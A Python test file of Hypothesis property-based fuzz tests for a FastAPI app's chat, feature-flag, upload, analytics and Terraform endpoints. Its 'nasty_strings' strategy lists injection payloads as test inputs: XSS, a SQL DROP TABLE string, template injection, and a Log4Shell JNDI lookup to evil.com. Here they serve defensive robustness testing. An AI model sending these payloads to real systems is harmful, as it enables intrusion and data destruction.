"""
Property-based tests using Hypothesis for critical API endpoints (Issue #375).

Tests edge cases: unicode input, oversized payloads, malformed data,
boundary values, and injection attempts.
"""

import pytest
from hypothesis import given, settings, HealthCheck
from hypothesis import strategies as st
from fastapi.testclient import TestClient


# ── Strategies ───────────────────────────────────────────────

# Arbitrary JSON-like dicts for fuzz testing
json_primitives = st.one_of(
    st.none(),
    st.booleans(),
    st.integers(min_value=-2**31, max_value=2**31),
    st.floats(allow_nan=False, allow_infinity=False),
    st.text(max_size=500),
)

json_values = st.recursive(
    json_primitives,
    lambda children: st.one_of(
        st.lists(children, max_size=5),
        st.dictionaries(st.text(min_size=1, max_size=20), children, max_size=5),
    ),
    max_leaves=20,
)

# Malicious/edge-case strings
nasty_strings = st.one_of(
    st.just(""),
    st.just(" "),
    st.just("\x00"),
    st.just("<script>alert(1)</script>"),
    st.just("'; DROP TABLE users; --"),
    st.just("{{7*7}}"),
    st.just("${jndi:ldap://evil.com}"),
    st.just("A" * 10_000),
    st.text(alphabet=st.characters(categories=("Lu", "Ll", "Nd", "Zs", "So")), min_size=1, max_size=200),
)


# ── Tests ────────────────────────────────────────────────────


class TestHealthEndpoint:
    """Property: /api/health always returns 200 with valid JSON."""

    def test_health_always_ok(self, test_client: TestClient):
        resp = test_client.get("/api/health")
        assert resp.status_code == 200
        data = resp.json()
        assert "status" in data


class TestChatbotPropertyTests:
    """Property-based tests for the chatbot endpoint."""

    @given(message=nasty_strings)
    @settings(max_examples=30, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_chatbot_never_crashes_on_nasty_input(self, test_client: TestClient, message: str):
        """The chatbot must never return 5xx on arbitrary input."""
        resp = test_client.post(
            "/api/chat",
            json={"session_id": "prop-test", "message": message},
        )
        assert resp.status_code < 500, f"Server error on input: {message!r}"

    @given(message=st.text(min_size=1, max_size=100))
    @settings(max_examples=20, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_chatbot_returns_valid_json(self, test_client: TestClient, message: str):
        """All chatbot responses must be valid JSON with a 'reply' field."""
        resp = test_client.post(
            "/api/chat",
            json={"session_id": "prop-test-json", "message": message},
        )
        if resp.status_code == 200:
            data = resp.json()
            assert "reply" in data


class TestFeatureFlagsPropertyTests:
    """Property-based tests for the feature flags endpoint."""

    @given(flag_name=st.text(min_size=1, max_size=50, alphabet=st.characters(categories=("Lu", "Ll", "Nd"))))
    @settings(max_examples=20, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_unknown_flag_returns_not_found_or_ok(self, test_client: TestClient, flag_name: str):
        """Querying unknown flags must not crash."""
        resp = test_client.get(f"/api/feature-flags/{flag_name}")
        assert resp.status_code in (200, 404), f"Unexpected status for flag {flag_name!r}"


class TestDiagramUploadPropertyTests:
    """Property-based tests for diagram upload validation."""

    @given(data=st.binary(min_size=1, max_size=100))
    @settings(max_examples=15, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_invalid_file_upload_rejected_gracefully(self, test_client: TestClient, data: bytes):
        """Uploading random binary data must not crash the server."""
        resp = test_client.post(
            "/api/diagrams/upload",
            files={"file": ("test.png", data, "image/png")},
        )
        assert resp.status_code < 500, f"Server error on random upload"


class TestAnalyticsPropertyTests:
    """Property-based tests for analytics endpoints."""

    @given(event_name=nasty_strings)
    @settings(max_examples=15, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_analytics_event_never_crashes(self, test_client: TestClient, event_name: str):
        """Recording analytics events with arbitrary names must not crash."""
        resp = test_client.post(
            "/api/analytics/events",
            json={"event": event_name, "properties": {}},
        )
        assert resp.status_code < 500


class TestTerraformPreviewPropertyTests:
    """Property-based tests for Terraform preview."""

    @given(hcl=st.text(min_size=0, max_size=2000))
    @settings(max_examples=15, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_preview_never_crashes_on_arbitrary_hcl(self, test_client: TestClient, hcl: str):
        """Terraform preview must handle arbitrary HCL input gracefully."""
        from terraform_preview import preview_terraform_plan
        result = preview_terraform_plan(hcl, "prop-test-diagram", use_simulation=True)
        assert result.success is True or len(result.errors) > 0


class TestIaCValidationPropertyTests:
    """Property-based tests for IaC syntax validation."""

    @given(code=st.text(min_size=0, max_size=1000))
    @settings(max_examples=20, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_validate_terraform_syntax_never_crashes(self, test_client: TestClient, code: str):
        """Terraform syntax validation must handle arbitrary input."""
        from terraform_preview import validate_terraform_syntax
        result = validate_terraform_syntax(code)
        assert isinstance(result, dict)
        assert "valid" in result
        assert "errors" in result
